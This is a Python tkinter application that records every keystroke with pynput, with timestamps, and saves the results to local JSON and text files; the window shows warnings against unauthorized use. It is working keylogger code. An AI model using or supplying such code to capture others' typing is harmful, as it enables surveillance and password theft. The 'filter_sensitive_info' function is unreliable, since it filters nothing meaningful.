import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import platform
import datetime
import threading

root = tk.Tk()
root.geometry("600x400")
root.title("Key Logger Application")
root.configure(bg='#FEB265')

key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if not x:
        key_list.append({'Type': 'Pressed', 'Key': str(key), 'Timestamp': str(datetime.datetime.now())})
        x = True
    else:
        key_list.append({'Type': 'Held', 'Key': str(key), 'Timestamp': str(datetime.datetime.now())})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Type': 'Released', 'Key': str(key), 'Timestamp': str(datetime.datetime.now())})
    if x:
        x = False
    key_strokes += str(key)
    update_txt_file(key_strokes)

def start_keylogger():
    logs_textarea.delete("1.0", "end")  # Clear previous logs
    logs_textarea.insert("end", "[+] Keylogger is running!\n[!] Saving the key logs in 'logs.json'\n")
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()  # Start the keylogger in a non-blocking way

def filter_sensitive_info(logs):
    # Implement your logic to filter sensitive information from the logs
    filtered_logs = []
    for log in logs:
        if log['Key'] != "password":
            filtered_logs.append(log)
    return filtered_logs

def export_logs():
    filtered_logs = filter_sensitive_info(key_list)
    if not filtered_logs:
        logs_textarea.insert("end", "\n[!] No logs to export.\n")
        return
    
    filename = f"logs_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as file:
        json.dump(filtered_logs, file)
    logs_textarea.insert("end", f"\n[+] Logs exported to {filename}\n")

# Running the keylogger in a separate thread
def start_keylogger_thread():
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

# GUI improvements
title_label = Label(root, text="Key Logger Application", font='Verdana 14 bold', bg='#FEB265')
title_label.pack(pady=10)

system_label = Label(root, text=f"System: {platform.system()}", font='Verdana 10', bg='#FEB265')
system_label.pack()

instruction_label = Label(root, text="Click 'Start KeyLogger' to begin logging. Use responsibly and adhere to legal and ethical guidelines.", font='Verdana 10', bg='#FEB265')
instruction_label.pack()

logs_frame = Frame(root, bg='white')
logs_frame.pack(pady=10)

logs_label = Label(logs_frame, text="Key Logs", font='Verdana 10 bold', bg='white')
logs_label.pack()

logs_scrollbar = Scrollbar(logs_frame)
logs_scrollbar.pack(side='right', fill='y')

logs_textarea = Text(logs_frame, width=60, height=10, font='Verdana 10', wrap='word', yscrollcommand=logs_scrollbar.set)
logs_textarea.pack()

logs_scrollbar.config(command=logs_textarea.yview)

start_button = Button(root, text="Start KeyLogger", font='Verdana 10 bold', command=start_keylogger_thread, bg='#FF8A00', fg='white')
start_button.pack(pady=10)

export_button = Button(root, text="Export Logs", font='Verdana 10', command=export_logs)
export_button.pack(pady=5)

warning_label = Label(root, text="Warning: Unauthorized use of keyloggers is illegal and unethical. Use responsibly and adhere to legal and ethical guidelines.", font='Verdana 8 italic', fg='red', bg='#FEB265')
warning_label.pack(pady=10)

root.mainloop()
